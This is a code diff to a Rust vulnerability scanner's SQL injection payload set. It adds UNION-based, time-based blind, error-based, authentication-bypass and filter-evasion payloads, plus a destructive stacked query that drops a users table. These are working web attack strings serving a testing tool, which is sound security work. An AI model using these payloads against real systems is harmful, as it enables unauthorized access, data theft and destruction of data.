@@ -16,6 +16,7 @@ impl PayloadSet {
         Self {
             vuln_type: VulnerabilityType::SQLInjection,
             payloads: vec![
+                // Classic boolean-based
                 Payload {
                     value: "' OR '1'='1".to_string(),
                     description: "Classic SQLi boolean-based".to_string(),
@@ -33,19 +34,70 @@ impl PayloadSet {
                     description: "SQLi with comment".to_string(),
                     detection_patterns: vec!["sql".to_string(), "error".to_string()],
                 },
+                // UNION-based
                 Payload {
                     value: "' UNION SELECT NULL--".to_string(),
                     description: "UNION-based SQLi".to_string(),
                     detection_patterns: vec!["union".to_string(), "select".to_string()],
                 },
                 Payload {
+                    value: "' UNION SELECT NULL,NULL,NULL--".to_string(),
+                    description: "UNION SQLi 3 columns".to_string(),
+                    detection_patterns: vec!["union".to_string()],
+                },
+                // Time-based blind
+                Payload {
                     value: "1' AND SLEEP(5)--".to_string(),
-                    description: "Time-based blind SQLi".to_string(),
+                    description: "Time-based blind SQLi (MySQL)".to_string(),
                     detection_patterns: vec![],
                 },
                 Payload {
+                    value: "1' WAITFOR DELAY '0:0:5'--".to_string(),
+                    description: "Time-based blind SQLi (MSSQL)".to_string(),
+                    detection_patterns: vec![],
+                },
+                Payload {
+                    value: "1' AND pg_sleep(5)--".to_string(),
+                    description: "Time-based blind SQLi (PostgreSQL)".to_string(),
+                    detection_patterns: vec![],
+                },
+                // Authentication bypass
+                Payload {
                     value: "admin'--".to_string(),
                     description: "Authentication bypass".to_string(),
+                    detection_patterns: vec![],
+                },
+                Payload {
+                    value: "' or '1'='1'/*".to_string(),
+                    description: "Auth bypass with comment".to_string(),
+                    detection_patterns: vec![],
+                },
+                // Error-based
+                Payload {
+                    value: "' AND 1=CONVERT(int, (SELECT @@version))--".to_string(),
+                    description: "Error-based SQLi (MSSQL)".to_string(),
+                    detection_patterns: vec!["version".to_string(), "microsoft".to_string()],
+                },
+                Payload {
+                    value: "' AND extractvalue(1,concat(0x7e,version()))--".to_string(),
+                    description: "Error-based SQLi (MySQL)".to_string(),
+                    detection_patterns: vec!["xpath".to_string()],
+                },
+                // Stacked queries
+                Payload {
+                    value: "'; DROP TABLE users--".to_string(),
+                    description: "Stacked query (dangerous!)".to_string(),
+                    detection_patterns: vec!["syntax".to_string()],
+                },
+                // Bypass filters
+                Payload {
+                    value: "' /*!50000OR*/ 1=1--".to_string(),
+                    description: "MySQL version comment bypass".to_string(),
+                    detection_patterns: vec![],
+                },
+                Payload {
+                    value: "' %23%0aOR%231=1".to_string(),
+                    description: "URL encoded with newline".to_string(),
                     detection_patterns: vec![],
                 },
             ],
